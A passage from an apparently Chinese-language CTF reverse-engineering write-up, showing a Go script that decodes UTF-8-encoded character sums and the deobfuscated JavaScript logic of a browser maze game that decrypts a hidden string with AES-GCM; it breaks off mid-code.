class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>它的输出文件长这样</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2017.32.29.png" alt="截屏2024-01-16 17.32.29"></p><p>很长而且很像，这其实就是go在把每个字符相加时，会超出ascii的范围，go就认为是其他种类的语言，就会更换存取方式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-string">&#x27;f&#x27;</span><br>b := <span class="hljs-string">&#x27;l&#x27;</span><br>c := a + b<br>fmt.Printf(<span class="hljs-string">&quot;a+b= %x&quot;</span>,<span class="hljs-type">string</span>(c))<br><br># c3 <span class="hljs-number">92</span> <br></code></pre></td></tr></table></figure><p>使用Unicode解码即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a_rune,_ := utf8.DecodeRune([]<span class="hljs-type">byte</span>(<span class="hljs-type">string</span>(a+b)))<br>fmt.Printf(<span class="hljs-string">&quot;%c\n&quot;</span>,a_rune-<span class="hljs-string">&#x27;f&#x27;</span>)<br></code></pre></td></tr></table></figure><p>可以方便的使用for语句进行解码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br>        <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-comment">// &quot;unicode/utf8&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>        a1 := []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0x69</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xC3</span>,<br>                <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x67</span>,<br>                <span class="hljs-number">0x65</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x94</span>,<br>                <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xA3</span>,<br>                <span class="hljs-number">0x69</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC3</span>,<br>                <span class="hljs-number">0x92</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xA4</span>&#125;<br>        a := <span class="hljs-number">0</span><br>        <span class="hljs-comment">// // 将字节数组转换为字符串</span><br>        str := <span class="hljs-type">string</span>(a1)<br><br>        <span class="hljs-comment">// // 解码整个字符串的 Unicode 码点</span><br>        <span class="hljs-keyword">for</span> _, r := <span class="hljs-keyword">range</span> str &#123;<br>                <span class="hljs-comment">// 将解码结果与整数 a 进行相减操作</span><br>                result:= <span class="hljs-type">int</span>(r) - a<br>                fmt.Printf(<span class="hljs-string">&quot;%c&quot;</span>,result)<br>                a=result<br>        &#125;<br><br><span class="hljs-comment">// a := &#x27;f&#x27;</span><br><span class="hljs-comment">// b := &#x27;l&#x27;</span><br><span class="hljs-comment">// c := a + b</span><br><span class="hljs-comment">// fmt.Printf(&quot;a+b= %x\n&quot;,string(c))</span><br><span class="hljs-comment">// a_rune,_ := utf8.DecodeRune([]byte(string(a+b)))</span><br><span class="hljs-comment">// fmt.Printf(&quot;%c\n&quot;,a_rune-&#x27;f&#x27;)</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h2><p>通过查看源代码等方式，可以发现网页游戏逻辑主要是混淆后的<code>tfg-min.js</code>所控制，在这个<a href="https://www.sojson.com/js.html">网站</a>或者这个<a href="https://deobfuscate.relative.im/">网站</a>可以在线解混淆，然后可以扔去Cyberchef美化一下顺便排个版。解混淆之后的代码长这个样子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> e = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;c&#x27;</span>), t = e.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&#x27;2d&#x27;</span>), a = [<br>    [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> [<br>        -<span class="hljs-number">17969</span>,<br>        -<span class="hljs-number">16540</span>,<br>        <span class="hljs-number">11745</span>,<br>        -<span class="hljs-number">12783</span>,<br>        <span class="hljs-number">3226</span>,<br>        <span class="hljs-number">15010</span>,<br>        <span class="hljs-number">10940</span>,<br>        <span class="hljs-number">3387</span>,<br>        -<span class="hljs-number">5306</span>,<br>        -<span class="hljs-number">4100</span>,<br>        -<span class="hljs-number">21425</span>,<br>        <span class="hljs-number">10338</span>,<br>        -<span class="hljs-number">16904</span>,<br>        -<span class="hljs-number">355</span>,<br>        <span class="hljs-number">13485</span>,<br>        -<span class="hljs-number">25858</span><br>    ].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e / <span class="hljs-number">503155</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>)),<br>    [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> [<br>        <span class="hljs-number">24356</span>,<br>        <span class="hljs-number">12443</span>,<br>        -<span class="hljs-number">34624</span>,<br>        -<span class="hljs-number">20408</span>,<br>        <span class="hljs-number">7719</span>,<br>        <span class="hljs-number">2169</span>,<br>        -<span class="hljs-number">12039</span>,<br>        -<span class="hljs-number">4767</span>,<br>        -<span class="hljs-number">11817</span>,<br>        -<span class="hljs-number">10941</span>,<br>        <span class="hljs-number">24441</span>,<br>        <span class="hljs-number">12396</span>,<br>        -<span class="hljs-number">17878</span>,<br>        -<span class="hljs-number">8011</span>,<br>        <span class="hljs-number">28295</span>,<br>        <span class="hljs-number">19198</span><br>    ].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e / <span class="hljs-number">138081</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>)),<br>    [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> [<br>        -<span class="hljs-number">14826</span>,<br>        <span class="hljs-number">3464</span>,<br>        <span class="hljs-number">5822</span>,<br>        -<span class="hljs-number">13182</span>,<br>        <span class="hljs-number">51761</span>,<br>        -<span class="hljs-number">11669</span>,<br>        -<span class="hljs-number">19467</span>,<br>        <span class="hljs-number">45292</span>,<br>        <span class="hljs-number">29097</span>,<br>        -<span class="hljs-number">6763</span>,<br>        -<span class="hljs-number">10919</span>,<br>        <span class="hljs-number">25324</span>,<br>        -<span class="hljs-number">11126</span>,<br>        <span class="hljs-number">2364</span>,<br>        <span class="hljs-number">4412</span>,<br>        -<span class="hljs-number">9672</span><br>    ].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e / <span class="hljs-number">10270</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>)),<br>    [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> [<br>        -<span class="hljs-number">10870</span>,<br>        <span class="hljs-number">13314</span>,<br>        <span class="hljs-number">3852</span>,<br>        <span class="hljs-number">6736</span>,<br>        <span class="hljs-number">8930</span>,<br>        -<span class="hljs-number">9852</span>,<br>        -<span class="hljs-number">1980</span>,<br>        -<span class="hljs-number">5468</span>,<br>        -<span class="hljs-number">982</span>,<br>        <span class="hljs-number">3891</span>,<br>        <span class="hljs-number">1980</span>,<br>        <span class="hljs-number">3481</span>,<br>        <span class="hljs-number">7174</span>,<br>        -<span class="hljs-number">9705</span>,<br>        -<span class="hljs-number">4194</span>,<br>        -<span class="hljs-number">6127</span><br>    ].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e / <span class="hljs-number">35766</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>))<br>], n = <span class="hljs-string">&#x27;Dugd8DbBCXnrEF1kKd2Hg4lsRQ1eV/6gQ+NfwsVhtr4UgeXQFq1m6WctmIljEG7PZg==&#x27;</span>, r = [<br>    <span class="hljs-string">&#x27;toy cube&#x27;</span>,<br>    <span class="hljs-string">&#x27;laser pointer&#x27;</span>,<br>    <span class="hljs-string">&#x27;large axle&#x27;</span>,<br>    <span class="hljs-string">&#x27;gift box&#x27;</span>,<br>    <span class="hljs-string">&#x27;dust pan&#x27;</span>,<br>    <span class="hljs-string">&#x27;tea kettle&#x27;</span>,<br>    <span class="hljs-string">&#x27;v-type engine&#x27;</span>,<br>    <span class="hljs-string">&#x27;stop sign&#x27;</span><br>], i = &#123;<br>    <span class="hljs-attr">a</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">b</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">c</span>: [<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span><br>    ],<br>    <span class="hljs-attr">d</span>: [<br>        <span class="hljs-number">38</span>,<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">37</span>,<br>        <span class="hljs-number">39</span><br>    ],<br>    <span class="hljs-attr">e</span>: [],<br>    <span class="hljs-attr">f</span>: &#123;<br>        <span class="hljs-attr">x</span>: <span class="hljs-number">40</span>,<br>        <span class="hljs-attr">y</span>: <span class="hljs-number">40</span>,<br>        <span class="hljs-attr">z</span>: []<br>    &#125;,<br>    <span class="hljs-attr">g</span>: &#123;<br>        <span class="hljs-attr">x</span>: -<span class="hljs-number">7</span>,<br>        <span class="hljs-attr">y</span>: -<span class="hljs-number">7</span><br>    &#125;,<br>    <span class="hljs-attr">h</span>: [],<br>    <span class="hljs-attr">i</span>: [],<br>    <span class="hljs-attr">j</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">k</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">l</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">let</span> t = e + <span class="hljs-number">1831565813</span>;<br>    <span class="hljs-keyword">return</span> t = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">imul</span>(t ^ t &gt;&gt;&gt; <span class="hljs-number">15</span>, <span class="hljs-number">1</span> | t), t ^= t + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">imul</span>(t ^ t &gt;&gt;&gt; <span class="hljs-number">7</span>, <span class="hljs-number">61</span> | t), ((t ^ t &gt;&gt;&gt; <span class="hljs-number">14</span>) &gt;&gt;&gt; <span class="hljs-number">0</span>) / <span class="hljs-number">4294967296</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">o</span>(<span class="hljs-params">e, a, n, r, c = <span class="hljs-number">1</span></span>) &#123;<br>    t.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">`rgba(<span class="hljs-subst">$&#123;[<span class="hljs-number">0</span>].reduce((e, t) =&gt; e.slice((c - <span class="hljs-number">1</span>) % <span class="hljs-number">3</span>).concat(e.slice(<span class="hljs-number">0</span>, (c - <span class="hljs-number">1</span>) % <span class="hljs-number">3</span>)), [</span></span><br><span class="hljs-subst"><span class="hljs-string">        <span class="hljs-number">25</span>,</span></span><br><span class="hljs-subst"><span class="hljs-string">        <span class="hljs-number">255</span> * s(i.a, a / <span class="hljs-number">500</span>),</span></span><br><span class="hljs-subst"><span class="hljs-string">        <span class="hljs-number">25</span></span></span><br><span class="hljs-subst"><span class="hljs-string">    ])&#125;</span>, 255)`</span>, t.<span class="hljs-title function_">fillRect</span>(e, a, n, r);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">y</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (i.<span class="hljs-property">g</span> = i.<span class="hljs-property">c</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">e, t, a</span>) =&gt;</span> <span class="hljs-number">1</span> === t ? &#123;<br>        <span class="hljs-attr">x</span>: e.<span class="hljs-property">x</span> + (a &lt; <span class="hljs-number">2</span> || <span class="hljs-number">1</span> &amp; i.<span class="hljs-property">f</span>.<span class="hljs-property">z</span>[i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> + <span class="hljs-number">7</span>][i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> + <span class="hljs-number">7</span> + (a - <span class="hljs-number">2</span>)] ? <span class="hljs-number">0</span> : <span class="hljs-number">2</span> * (a - <span class="hljs-number">2</span>) - <span class="hljs-number">1</span>),<br>        <span class="hljs-attr">y</span>: e.<span class="hljs-property">y</span> + (a &gt;= <span class="hljs-number">2</span> || <span class="hljs-number">2</span> &amp; i.<span class="hljs-property">f</span>.<span class="hljs-property">z</span>[i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> + <span class="hljs-number">7</span> + a][i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> + <span class="hljs-number">7</span>] ? <span class="hljs-number">0</span> : <span class="hljs-number">2</span> * a - <span class="hljs-number">1</span>)<br>    &#125; : &#123;<br>        <span class="hljs-attr">x</span>: e.<span class="hljs-property">x</span>,<br>        <span class="hljs-attr">y</span>: e.<span class="hljs-property">y</span><br>    &#125;, &#123;<br>        <span class="hljs-attr">x</span>: i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span>,<br>        <span class="hljs-attr">y</span>: i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span><br>    &#125;), i.<span class="hljs-property">c</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> === e)) &#123;<br>        i.<span class="hljs-property">j</span> &lt;&lt;= <span class="hljs-number">2</span>, i.<span class="hljs-property">j</span> |= <span class="hljs-number">3</span> &amp; i.<span class="hljs-property">d</span>[i.<span class="hljs-property">c</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> === e)], i.<span class="hljs-property">j</span> &gt;= <span class="hljs-number">64</span> &amp;&amp; (i.<span class="hljs-property">i</span>.<span class="hljs-title function_">push</span>((<span class="hljs-number">63</span> &amp; i.<span class="hljs-property">j</span>) - <span class="hljs-number">32</span>), i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>), i.<span class="hljs-property">k</span> = i.<span class="hljs-property">k</span> + <span class="hljs-number">211</span> * (i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> + <span class="hljs-number">9</span>) * (i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> + <span class="hljs-number">9</span>) * <span class="hljs-number">239</span> &amp; <span class="hljs-number">4294967295</span>, <span class="hljs-number">16</span> == i.<span class="hljs-property">i</span>.<span class="hljs-property">length</span> &amp;&amp; <span class="hljs-number">1</span> === i.<span class="hljs-property">j</span> &amp;&amp; i.<span class="hljs-property">e</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;1,6,11,16&#x27;</span> == (e = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> i.<span class="hljs-property">i</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>)), t = a[i.<span class="hljs-property">b</span>], e.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> t[<span class="hljs-number">0</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, a</span>) =&gt;</span> t.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e[a])).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> e.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">a, n</span>) =&gt;</span> e[n] * t[n]).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> e + t)))).<span class="hljs-title function_">flatMap</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-number">100</span> * e) / <span class="hljs-number">100</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> <span class="hljs-number">1</span> === e ? t + <span class="hljs-number">1</span> : e).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e) ? i.<span class="hljs-property">k</span> : -<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">const</span> r = i.<span class="hljs-property">h</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-property">x</span> === i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> &amp;&amp; e.<span class="hljs-property">y</span> === i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span>);<br>        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> !== r) &#123;<br>            <span class="hljs-keyword">const</span> e = i.<span class="hljs-property">h</span>[r].<span class="hljs-property">name</span>;<br>            i.<span class="hljs-property">h</span>.<span class="hljs-title function_">splice</span>(r, <span class="hljs-number">1</span>), i.<span class="hljs-property">l</span> = <span class="hljs-string">`found <span class="hljs-subst">$&#123;e&#125;</span>!`</span>, <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                i.<span class="hljs-property">l</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>            &#125;, <span class="hljs-number">4000</span>);<br>        &#125;<br>        i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> === i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">9</span> &amp;&amp; i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> === i.<span class="hljs-property">f</span>.<span class="hljs-property">y</span> - <span class="hljs-number">9</span> &amp;&amp; (i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> = -<span class="hljs-number">7</span>, i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> = -<span class="hljs-number">7</span>, i.<span class="hljs-property">i</span> = [], i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>, i.<span class="hljs-property">k</span> = <span class="hljs-number">0</span>, <span class="hljs-title function_">f</span>(++i.<span class="hljs-property">b</span>), <span class="hljs-number">4</span> !== i.<span class="hljs-property">b</span> || <span class="hljs-number">4</span> !== i.<span class="hljs-property">e</span>.<span class="hljs-property">length</span> || i.<span class="hljs-property">e</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> -<span class="hljs-number">1</span> === e) || <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>            <span class="hljs-keyword">const</span> t = i.<span class="hljs-property">e</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>)).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>), a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-title function_">atob</span>(e).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>))), n = <span class="hljs-title class_">Uint8Array</span>.<span class="hljs-title function_">from</span>([<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">1</span>,<br>                <span class="hljs-number">2</span>,<br>                <span class="hljs-number">3</span>,<br>                <span class="hljs-number">4</span>,<br>                <span class="hljs-number">5</span>,<br>                <span class="hljs-number">6</span>,<br>                <span class="hljs-number">7</span>,<br>                <span class="hljs-number">8</span>,<br>                <span class="hljs-number">9</span>,<br>                <span class="hljs-number">10</span>,<br>                <span class="hljs-number">11</span><br>            ]), r = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>().<span class="hljs-title function_">encode</span>(t), c = <span class="hljs-keyword">await</span> crypto.<span class="hljs-property">subtle</span>.importKey(<span class="hljs-string">&#x27;raw&#x27;</span>, r, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;AES-GCM&#x27;</span> &#125;, !<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;decrypt&#x27;</span>]), o = <span class="hljs-keyword">await</span> crypto.<span class="hljs-property">subtle</span>.<span class="hljs-title function_">decrypt</span>(&#123;<br>                <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;AES-GCM&#x27;</span>,<br>                <span class="hljs-attr">iv</span>: n<br>            &#125;, c, a);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>().<span class="hljs-title function_">decode</span>(o);<br>        &#125;(n).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> i.<span class="hljs-property">l</span> = 